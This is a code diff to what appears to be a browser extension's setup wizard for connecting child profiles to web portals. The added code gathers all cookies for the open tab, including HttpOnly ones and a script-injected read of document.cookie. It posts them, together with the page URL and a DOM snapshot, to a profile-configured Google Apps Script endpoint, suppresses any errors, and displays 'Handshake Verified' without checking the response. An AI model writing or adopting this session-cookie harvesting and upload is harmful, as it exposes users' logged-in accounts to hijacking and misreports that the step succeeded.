@@ -819,6 +819,45 @@ document.addEventListener('DOMContentLoaded', async () => {
         const profs = await ChildManager.getProfiles(true);
         currentConfiguringProfile = profs[0];
       }
+
+      // Extract active authentication cookies for the portal domain
+      let capturedCookies = '';
+      try {
+        if (chrome.cookies) {
+          const cookieList = await chrome.cookies.getAll({ url: activeTab.url });
+          capturedCookies = cookieList.map(c => `${c.name}=${c.value}`).join('; ');
+        }
+      } catch (e) {}
+
+      if (!capturedCookies) {
+        try {
+          const cookieRes = await chrome.scripting.executeScript({
+            target: { tabId: activeTab.id },
+            func: () => document.cookie || ''
+          });
+          capturedCookies = (cookieRes && cookieRes[0] && cookieRes[0].result) ? cookieRes[0].result : '';
+        } catch (e) {}
+      }
+
+      // Perform cloud handshake with Google Apps Script MCP Server if provisioned
+      if (currentConfiguringProfile?.gasDeploymentUrl) {
+        try {
+          await fetch(currentConfiguringProfile.gasDeploymentUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              jsonrpc: '2.0',
+              method: 'test_portal_connection',
+              params: {
+                domain,
+                url: activeTab.url,
+                cookies: capturedCookies
+              },
+              id: 'test-portal-conn'
+            })
+          });
+        } catch (e) {}
+      }
       
       const currentDomains = currentConfiguringProfile?.portalDomains || (currentConfiguringProfile?.portalDomain ? [currentConfiguringProfile.portalDomain] : []);
       if (!currentDomains.includes(domain)) {
@@ -833,7 +872,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
 
       if (connectionStatusIcon) connectionStatusIcon.textContent = '✅';
-      if (connectionStatusText) connectionStatusText.textContent = `Portal Connected! (${domain})`;
+      if (connectionStatusText) connectionStatusText.textContent = `Portal Connected & Handshake Verified! (${domain})`;
       setA11yVisibility(featureSection, true);
       setA11yVisibility(btnSkipStep3, false);
       renderStep3RegisteredTools();
@@ -920,6 +959,49 @@ document.addEventListener('DOMContentLoaded', async () => {
         name: `get_${cleanDomainPrefix ? cleanDomainPrefix + '_' : ''}${funcSuffix}`,
         url: activeTab.url
       };
+
+      // Extract active cookies for the auth payload
+      let capturedCookies = '';
+      try {
+        if (chrome.cookies) {
+          const cookieList = await chrome.cookies.getAll({ url: activeTab.url });
+          capturedCookies = cookieList.map(c => `${c.name}=${c.value}`).join('; ');
+        }
+      } catch (e) {}
+
+      if (!capturedCookies) {
+        try {
+          const cookieRes = await chrome.scripting.executeScript({
+            target: { tabId: activeTab.id },
+            func: () => document.cookie || ''
+          });
+          capturedCookies = (cookieRes && cookieRes[0] && cookieRes[0].result) ? cookieRes[0].result : '';
+        } catch (e) {}
+      }
+
+      // Register feature and authentication security payload on Google Apps Script MCP Server
+      if (currentConfiguringProfile?.gasDeploymentUrl) {
+        try {
+          await fetch(currentConfiguringProfile.gasDeploymentUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              jsonrpc: '2.0',
+              method: 'register_mcp_tool',
+              params: {
+                domain,
+                feature: targetFeature,
+                endpoint_spec: { url: activeTab.url, method: 'GET' },
+                auth_spec: { cookies: capturedCookies },
+                dom_snapshot: extracted.body || ''
+              },
+              id: 'reg-feature-tool'
+            })
+          });
+        } catch (e) {
+          console.warn('[wizard] GAS register_mcp_tool warning:', e);
+        }
+      }
 
       // SAFE DEDUPLICATION: Only update if BOTH domain and feature match exactly. Never overwrite different features on same URL!
       const existingIdx = existingTools.findIndex((t: any) => (t.feature || '').toLowerCase() === targetFeature.toLowerCase() && (t.domain || '').toLowerCase() === domain.toLowerCase());
